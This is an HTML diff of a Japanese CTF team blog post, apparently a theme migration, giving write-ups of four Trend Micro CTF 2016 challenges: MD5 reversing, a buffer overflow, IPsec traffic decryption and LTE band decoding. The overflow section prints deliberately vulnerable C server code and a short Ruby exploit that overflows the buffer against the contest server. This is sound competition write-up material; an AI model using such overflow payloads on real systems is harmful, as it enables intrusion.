@@ -1,84 +1,121 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trend Micro CTF 2016 Online qualifier &middot; urandom</title>
-
-    <meta name="description" content="">
-
-    <meta name="generator" content="Hugo 0.68.3" />
-    <meta name="twitter:card" content="summary">
     
-    <meta name="twitter:title" content="Trend Micro CTF 2016 Online qualifier &middot; urandom">
-    <meta name="twitter:description" content="">
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.92.1" />
 
-    <meta property="og:type" content="article">
-    <meta property="og:title" content="Trend Micro CTF 2016 Online qualifier &middot; urandom">
-    <meta property="og:description" content="">
 
-    <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:400,700|Oxygen:400,700' rel='stylesheet' type='text/css'>
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
 
-    <link rel="stylesheet" href='//blog.urandom.team/css/all.min.css'>
-    <link rel="stylesheet" href='//blog.urandom.team/css/syntax.css'>
-    <link rel="stylesheet" href='//blog.urandom.team/css/custom.css'>
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
 
-    <link rel="alternate" type="application/rss+xml" title="urandom" href='//blog.urandom.team/index.xml' />
+<title>Trend Micro CTF 2016 Online qualifier - urandom</title>
+
+
+<meta name="author" content="urandom" />
+
+
+<meta name="description" content="CTF team made up of graduates from University of Tsukuba, Japan" />
+
+
+<meta name="keywords" content="CTF, Write-ups, TMCTF" />
+
+
+<meta property="og:title" content="Trend Micro CTF 2016 Online qualifier" />
+<meta name="twitter:title" content="Trend Micro CTF 2016 Online qualifier" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://urandom.team/post/tmctf2016-qual/" /><meta property="og:description" content="日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われたTrend Micro CTF 2016のwrite-upです。 urandomは4問解答し600点、92位でした。 Analysis-Offensive 100をyyu、Analysis-Offensi" />
+<meta name="twitter:description" content="日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われたTrend Micro CTF 2016のwrite-upです。 urandomは4問解答し600点、92位でした。 Analysis-Offensive 100をyyu、Analysis-Offensi" /><meta property="og:image" content="https://urandom.team/images/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://urandom.team/images/og.png" /><meta property="article:published_time" content="2016-08-17T00:17:26+09:00" /><meta property="article:modified_time" content="2016-08-17T00:17:26+09:00" />
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+
+
+<link rel="stylesheet" href="https://urandom.team/assets/css/fuji.min.css" />
+
+
+
+
+
+
+
+
 </head>
-<body>
 
+<body
+  data-theme="auto"
+  data-theme-auto='true'
+  >
+    <script data-cfasync="false">
+  
+  var fujiThemeData = localStorage.getItem('fuji_data-theme');
+  
+  if (!fujiThemeData) {
+    localStorage.setItem('fuji_data-theme', 'auto');
+  } else {
+    
+    if (fujiThemeData !== 'auto') {
+      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+    }
+  }
+</script>
 
-<div id="layout" class="pure-g">
-    <div class="sidebar pure-u-1 pure-u-md-1-4">
-    <div class="header">
-        <hgroup>
-            <h1 class="brand-title"><a href="//blog.urandom.team">urandom</a></h1>
-            <h2 class="brand-tagline"></h2>
-        </hgroup>
-
-        <nav class="nav">
-            <ul class="nav-list">
-                
-                
-                
-                
-                <li class="nav-item">
-                    <a class="pure-button" href='//blog.urandom.team/index.xml'>
-                        <i class="fa fa-rss"></i> rss
-                    </a>
-                </li>
-            </ul>
-        </nav>
-    </div>
-</div>
-
-
-    <div class="content pure-u-1 pure-u-md-3-4">
-        <div>
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://urandom.team">urandom</a>
             
-            <div class="posts">
-                <h1 class="content-subhead">17 Aug 2016, 00:17</h1>
-                <section class="post">
-                    <header class="post-header">
+        </div>
+    </div>
+</header>
 
-                        <a href="//blog.urandom.team/post/tmctf2016-qual/" class="post-title">Trend Micro CTF 2016 Online qualifier</a>
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://urandom.team/post/tmctf2016-qual/">Trend Micro CTF 2016 Online qualifier</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2016-08-17</span>
 
-                        <p class="post-meta">
-                            
-                            
-                                under 
-                                
-                                    <a class="post-category post-category-Write-ups" href='//blog.urandom.team/categories/Write-ups'>Write-ups</a>
-                                
-                            
-                        </p>
-                    </header>
-                    
-                    <div class="post-description">
-                        <p>日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた<a href="http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/">Trend Micro CTF 2016</a>のwrite-upです。</p>
+
+
+<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/ctf">CTF</a>&nbsp;<a href="/tags/write-ups">Write-ups</a>&nbsp;<a href="/tags/tmctf">TMCTF</a>&nbsp;</span>
+
+    </div>
+    
+    <div class="post-content markdown-body">
+        <p>日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた<a href="http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/" target="_blank">Trend Micro CTF 2016</a>のwrite-upです。</p>
 <p>urandomは4問解答し600点、92位でした。</p>
 <p>Analysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。</p>
 <h1 id="analysis---offensive-100">Analysis - Offensive 100</h1>
@@ -93,56 +130,31 @@ Decrypt the downloaded file by the following command.</p>
 </blockquote>
 <p>この問題は巨大なJavaScriptから正解の鍵を得るというものです。
 まず、巨大なJavaScriptのうちの多くの部分は定数をGoogleで調べるなどすると、MD5を実装しているということが分かります。そして、次の3つの文字列もMD5のハッシュ値であろうという推測ができます。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">ko</span> <span class="o">=</span> <span class="s2">&#34;c33367701511b4f6020ec61ded352059&#34;</span><span class="p">;</span>
+<pre><code class="language-javascript">var ko = &quot;c33367701511b4f6020ec61ded352059&quot;;
 
-<span class="kd">var</span> <span class="nx">ka</span> <span class="o">=</span> <span class="s2">&#34;61636f697b57b5b7d389db0edb801fc3&#34;</span><span class="p">;</span>
+var ka = &quot;61636f697b57b5b7d389db0edb801fc3&quot;;
 
-<span class="kd">var</span> <span class="nx">kq</span> <span class="o">=</span> <span class="s2">&#34;d2172edf24129e06f3913376a12919a4&#34;</span><span class="p">;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</p>
+var kq = &quot;d2172edf24129e06f3913376a12919a4&quot;;
+</code></pre>
+<p>これらをまたGoogleで調べると、それぞれ次のような文字列であることが分かります。</p>
 <ul>
 <li><code>c33367701511b4f6020ec61ded352059</code> → <code>654321</code></li>
 <li><code>61636f697b57b5b7d389db0edb801fc3</code> → <code>qwerty</code></li>
 <li><code>d2172edf24129e06f3913376a12919a4</code> → <code>admin</code></li>
 </ul>
 <p>そして次の処理でこれらの文字列を変数<code>nl</code>に従って並び換えているということが分かります。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">d</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
-<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">f</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="p">)</span> <span class="p">{</span>
-    <span class="nx">c</span> <span class="o">+=</span> <span class="nx">b</span><span class="p">[</span><span class="nx">nl</span><span class="p">[</span><span class="o">++</span><span class="nx">f</span><span class="p">]];</span>
-    <span class="nx">d</span> <span class="o">+=</span> <span class="nx">b</span><span class="p">[</span><span class="nx">nl</span><span class="p">[</span><span class="o">++</span><span class="nx">f</span><span class="p">]];</span>
-    <span class="nx">e</span> <span class="o">+=</span> <span class="nx">b</span><span class="p">[</span><span class="nx">nl</span><span class="p">[</span><span class="o">++</span><span class="nx">f</span><span class="p">]];</span>
-<span class="p">}</span>
+<pre><code class="language-javascript">var c = &quot;&quot;, d = &quot;&quot;, e = &quot;&quot;;
+for (var f = 0; f &lt; b.length; ) {
+    c += b[nl[++f]];
+    d += b[nl[++f]];
+    e += b[nl[++f]];
+}
 
-<span class="c1">// ......中略......
-</span><span class="c1"></span>
-<span class="kd">var</span> <span class="nx">nl</span> <span class="o">=</span> <span class="p">[</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span> <span class="p">];</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>最終的にフラグは<code>TMCTF{q6r4dy5ei2na1twm3}</code>でした。</p>
+// ......中略......
+
+var nl = [ 0, 2, 1, 12, 7, 15, 5, 4, 8, 16, 17, 3, 9, 10, 14, 11, 13, 6, 0 ];
+</code></pre>
+<p>最終的にフラグは<code>TMCTF{q6r4dy5ei2na1twm3}</code>でした。</p>
 <h1 id="analysis---offensive-200">Analysis - Offensive 200</h1>
 <blockquote>
 <p>Category: Analysis - offensive</p>
@@ -150,110 +162,57 @@ Decrypt the downloaded file by the following command.</p>
 <p>This challenge is composed of a simple remote overflow of a global array. The server address is 52.197.128.90 and the vulnerable application listens on TCP port 80-85. Each port has the same behavior so you can select one of them.</p>
 <p>The following code contains a bug that can be exploited to read back a flag:</p>
 </blockquote>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">pwned</span><span class="p">;</span>
-<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+<pre><code class="language-c">int pwned;
+char buffer[1024];
 
-<span class="n">DWORD</span> <span class="n">WINAPI</span> <span class="nf">CallBack</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">)</span> <span class="p">{</span>
-	<span class="n">pwned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="n">ZeroMemory</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
-	<span class="n">SOCKET</span> <span class="o">*</span><span class="n">sock</span> <span class="o">=</span> <span class="p">(</span><span class="n">SOCKET</span> <span class="o">*</span><span class="p">)</span><span class="n">lpParameter</span><span class="p">;</span>
-	<span class="n">SOCKET</span> <span class="n">_sock</span> <span class="o">=</span> <span class="o">*</span><span class="n">sock</span><span class="p">;</span>
-	<span class="n">send</span><span class="p">(</span><span class="n">_sock</span><span class="p">,</span> <span class="s">&#34;Welcome&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-	<span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="n">ret</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">_sock</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">1028</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[x] RET: %d.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[x] PWNED: 0x%x.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pwned</span><span class="p">);</span>
-	<span class="n">Sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-	<span class="k">if</span> <span class="p">(((</span><span class="n">pwned</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xFFFF</span> <span class="o">^</span> <span class="mh">0xc0fe</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x7eaf</span> <span class="o">&amp;&amp;</span> <span class="p">(((</span><span class="n">pwned</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="p">)</span><span class="o">^</span><span class="mh">0x1a1a</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xdae4</span><span class="p">))</span> <span class="p">{</span>
+DWORD WINAPI CallBack(LPVOID lpParameter) {
+	pwned = 0;
+	ZeroMemory(buffer, 1024);
+	SOCKET *sock = (SOCKET *)lpParameter;
+	SOCKET _sock = *sock;
+	send(_sock, &quot;Welcome&quot;, 8, 0);
+	int ret = 0;
+	ret = recv(_sock, buffer, 1028, 0);
+	printf(&quot;[x] RET: %d.\n&quot;, ret);
+	printf(&quot;[x] PWNED: 0x%x.\n&quot;, pwned);
+	Sleep(1);
+	if (((pwned &gt;&gt; 16)&amp;0xFFFF ^ 0xc0fe) == 0x7eaf &amp;&amp; (((pwned &amp; 0xFFFF)^0x1a1a) == 0xdae4)) {
 
-			<span class="n">send</span><span class="p">(</span><span class="n">_sock</span><span class="p">,</span> <span class="s">&#34;PWNED&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-			<span class="n">ReadAndReturn</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;key.txt&#34;</span><span class="p">,</span> <span class="n">_sock</span><span class="p">);</span>
-			<span class="n">closesocket</span><span class="p">(</span><span class="n">_sock</span><span class="p">);</span>
-			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-	<span class="p">}</span>
-	<span class="k">else</span> <span class="p">{</span>
-		<span class="n">send</span><span class="p">(</span><span class="n">_sock</span><span class="p">,</span> <span class="s">&#34;GO AWAY&#34;</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-		<span class="n">closesocket</span><span class="p">(</span><span class="n">_sock</span><span class="p">);</span>
-	<span class="p">}</span>
+			send(_sock, &quot;PWNED&quot;, 5, 0);
+			ReadAndReturn(L&quot;key.txt&quot;, _sock);
+			closesocket(_sock);
+			return 0;
+	}
+	else {
+		send(_sock, &quot;GO AWAY&quot;, 7, 0);
+		closesocket(_sock);
+	}
 
-	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
- <span class="p">}</span>
-</code></pre></td></tr></table>
-</div>
-</div><blockquote>
+	return 0;
+ }
+</code></pre>
+<blockquote>
 <p>Craft a packet that would return a valid flag. Good luck!</p>
 </blockquote>
 <p><code>buffer</code>が1024バイトしか確保されていないにもかかわらず、11行目で <code>ret = recv(_sock, buffer, 1028, 0);</code> と1028バイト読み込むようになっている。したがって、1025-1028バイトの範囲に特定のバイト列を仕込めばよい。満たすべき条件は15行目のif文。</p>
 <p>なぜか <code>nc</code> が1024バイトで送信を打ち切ってしまったので、Rubyで書いた。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+<pre><code class="language-ruby">require 'socket'
 
-<span class="no">HOST</span> <span class="o">=</span> <span class="s1">&#39;52.197.128.90&#39;</span>
-<span class="n">port</span> <span class="o">=</span> <span class="p">(</span><span class="mi">80</span><span class="o">..</span><span class="mi">85</span><span class="p">)</span><span class="o">.</span><span class="n">to_a</span><span class="o">.</span><span class="n">sample</span>
+HOST = '52.197.128.90'
+port = (80..85).to_a.sample
 
-<span class="nb">puts</span> <span class="s2">&#34;connecting </span><span class="si">#{</span><span class="no">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span>
-<span class="n">sock</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;52.197.128.90&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+puts &quot;connecting #{HOST}:#{port}&quot;
+sock = TCPSocket.open('52.197.128.90', port)
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\xfe\xc0\x51\xbe</span><span class="s2">&#34;</span>
+payload = 'a' * 1024 + &quot;\xfe\xc0\x51\xbe&quot;
 
-<span class="n">sock</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
-<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-<span class="k">while</span> <span class="n">r</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">gets</span>
-  <span class="nb">puts</span> <span class="n">r</span>
-<span class="k">end</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>そして正解をメモし忘れた 😇</p>
+sock.read(8)
+sock.send(payload, 0)
+while r = sock.gets
+  puts r
+end
+</code></pre>
+<p>そして正解をメモし忘れた 😇</p>
 <h1 id="misc-100">Misc 100</h1>
 <blockquote>
 <p>Category: Misc(iot and network)</p>
@@ -286,7 +245,8 @@ src 1.1.1.11 dst 1.1.1.10
 	replay-window 32 flag 20
 	auth hmac(sha1) 0x100a0b23fc006c867455506843cc96ad26026ec0
 	enc cbc(aes) 0xdcfbc7d33d3c606de488c6efac4624ed50b550c88be0d62befb049992972cca6
-</code></pre><p>この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に <code>flag.png</code> というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。</p>
+</code></pre>
+<p>この情報を元に、IPsecの通信の中身を見ることができる。すると、HTTPでいくつかやりとりをしている箇所が見つかる。その中に <code>flag.png</code> というファイルのダウンロードが含まれている。これを抽出して開くと、フラグが書かれている。</p>
 <h1 id="misc-200">Misc 200</h1>
 <blockquote>
 <p>Category: Misc(iot and network)</p>
@@ -307,45 +267,225 @@ FF 1D 1F 03 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-</code></pre><p>ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。</p>
+</code></pre>
+<p>ここに書き込まれている数値が対応LTEバンドを表している。ビット単位で読んで、あるビットが立っていたら、そのビットと対応するバンドをサポートしていることを意味している。最右ビットがバンド1に対応する。</p>
 <p>寝起きでつらいワンライナーを書いておしまい。エンディアンに注意。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nb">puts</span> <span class="p">(</span><span class="mh">0x031F1DFF</span><span class="p">)</span><span class="o">.</span><span class="n">to_s</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">reverse</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sr">//</span><span class="p">)</span><span class="o">.</span><span class="n">map</span> <span class="p">{</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span> <span class="n">i</span> <span class="o">+=</span><span class="mi">1</span><span class="p">;</span> <span class="o">[</span><span class="n">c</span><span class="p">,</span> <span class="n">i</span><span class="o">]</span> <span class="p">}</span><span class="o">.</span><span class="n">select</span> <span class="p">{</span> <span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="n">x</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span> <span class="p">}</span><span class="o">.</span><span class="n">map</span> <span class="p">{</span> <span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="n">x</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="p">}</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
-</code></pre></td></tr></table>
-</div>
-</div>
-                    </div>
-                    
-                </section>
+<pre><code class="language-ruby">i=0; puts (0x031F1DFF).to_s(2).reverse.split(//).map { |c| i +=1; [c, i] }.select { |x| x[0] == '1' }.map { |x| x[1] }.join(',')
+</code></pre>
+
+    </div>
+</article>
+
+
+
+
             </div>
-            <div class="footer">
-    <div class="pure-menu pure-menu-horizontal pure-menu-open">
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
         <ul>
-            <li>Powered by <a class="hugo" href="https://gohugo.io/" target="_blank">hugo</a></li>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+            <li>
+                <a href="/books/">Publication</a>
+            </li>
+            
+            <li>
+                <a href="/index.xml">RSS</a>
+            </li>
+            
         </ul>
     </div>
-</div>
-<script src='//blog.urandom.team/js/all.min.js'></script>
-
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/urandom-ctf" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/ctf/">CTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/e-book/">E-book</a>
+            </span>
+            
+            <span>
+                <a href="/tags/misc/">Misc</a>
+            </span>
+            
+            <span>
+                <a href="/tags/publication/">Publication</a>
+            </span>
+            
+            <span>
+                <a href="/tags/seccon/">SECCON</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tech/">tech</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tmctf/">TMCTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/write-ups/">Write-ups</a>
+            </span>
+            
         </div>
     </div>
+    <div class="sidebar-item sidebar-toc">
+        <h3>Table of Contents</h3><nav id="TableOfContents"></nav></div>
+</aside>
+
+        </div>
+        <div class="btn">
+    <div class="btn-menu" id="btn-menu">
+        <i class="iconfont icon-grid-sharp"></i>
+    </div>
+    <div class="btn-toggle-mode">
+        <i class="iconfont icon-contrast-sharp"></i>
+    </div>
+    <div class="btn-scroll-top">
+        <i class="iconfont icon-chevron-up-circle-sharp"></i>
+    </div>
 </div>
+<aside class="sidebar-mobile" style="display: none;">
+  <div class="sidebar-wrapper">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>Pages</h3>
+        <ul>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+            <li>
+                <a href="/books/">Publication</a>
+            </li>
+            
+            <li>
+                <a href="/index.xml">RSS</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>Links</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/urandom-ctf" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>Tags</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/ctf/">CTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/e-book/">E-book</a>
+            </span>
+            
+            <span>
+                <a href="/tags/misc/">Misc</a>
+            </span>
+            
+            <span>
+                <a href="/tags/publication/">Publication</a>
+            </span>
+            
+            <span>
+                <a href="/tags/seccon/">SECCON</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tech/">tech</a>
+            </span>
+            
+            <span>
+                <a href="/tags/tmctf/">TMCTF</a>
+            </span>
+            
+            <span>
+                <a href="/tags/write-ups/">Write-ups</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>Table of Contents</h3>
+        <nav id="TableOfContents"></nav>
+    </div>
+    
+    
+  </div>
+</aside>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            
+            <span>&copy; 2015-2022
+                <a href="https://urandom.team">urandom</a>
+                All rights reserved.
+                 | <a href="https://github.com/urandom-ctf/urandom-ctf.github.io">Source code</a> 
+                | Powered by <a href="https://github.com/dsrkafuu/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
+                                                    target="_blank">Hugo</a> 
+            </span>
+        </div>
+    </div>
+</footer>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js"></script>
 
 
-<script>
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
 
-ga('create', '', 'auto');
